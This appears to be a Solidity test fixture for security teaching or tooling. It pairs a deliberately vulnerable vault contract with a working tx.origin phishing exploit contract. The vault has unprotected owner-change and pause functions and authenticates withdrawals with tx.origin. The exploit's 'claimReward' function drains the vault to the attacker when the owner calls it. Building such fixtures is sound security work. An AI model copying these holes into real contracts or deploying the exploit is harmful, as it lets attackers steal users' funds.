// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableVault
 * @notice This contract is intentionally vulnerable for testing purposes.
 * @dev Contains access control vulnerabilities.
 */
contract VulnerableVault {
    address public owner;
    mapping(address => uint256) public balances;
    bool public paused;
    
    event OwnerChanged(address indexed oldOwner, address indexed newOwner);
    event FundsWithdrawn(address indexed to, uint256 amount);
    
    constructor() {
        owner = msg.sender;
    }
    
    /**
     * @notice Deposit ETH
     */
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    /**
     * @notice Change the contract owner
     * @dev VULNERABLE: No access control - anyone can call this!
     */
    function setOwner(address _newOwner) public {
        // Missing: require(msg.sender == owner, "Not owner");
        address oldOwner = owner;
        owner = _newOwner;
        emit OwnerChanged(oldOwner, _newOwner);
    }
    
    /**
     * @notice Emergency withdraw all funds
     * @dev VULNERABLE: Uses tx.origin for authentication
     */
    function emergencyWithdraw(address _to) external {
        // VULNERABILITY: tx.origin can be exploited via phishing
        require(tx.origin == owner, "Not authorized");
        
        uint256 amount = address(this).balance;
        payable(_to).transfer(amount);
        emit FundsWithdrawn(_to, amount);
    }
    
    /**
     * @notice Pause the contract
     * @dev VULNERABLE: No access control
     */
    function pause() public {
        // Anyone can pause!
        paused = true;
    }
    
    /**
     * @notice Unpause the contract
     * @dev VULNERABLE: No access control  
     */
    function unpause() public {
        // Anyone can unpause!
        paused = false;
    }
    
    /**
     * @notice Withdraw user funds
     */
    function withdraw(uint256 _amount) external {
        require(!paused, "Contract is paused");
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        balances[msg.sender] -= _amount;
        payable(msg.sender).transfer(_amount);
    }
}

/**
 * @title PhishingAttacker
 * @notice Demonstrates tx.origin attack
 */
contract PhishingAttacker {
    VulnerableVault public vault;
    address public attacker;
    
    constructor(address _vault) {
        vault = VulnerableVault(_vault);
        attacker = msg.sender;
    }
    
    /**
     * @notice Trick the owner into calling this "innocent" function
     * @dev When owner calls this, tx.origin == owner, bypassing the check
     */
    function claimReward() external {
        // This will pass if called by the vault owner
        // because tx.origin will be the owner
        vault.emergencyWithdraw(attacker);
    }
}
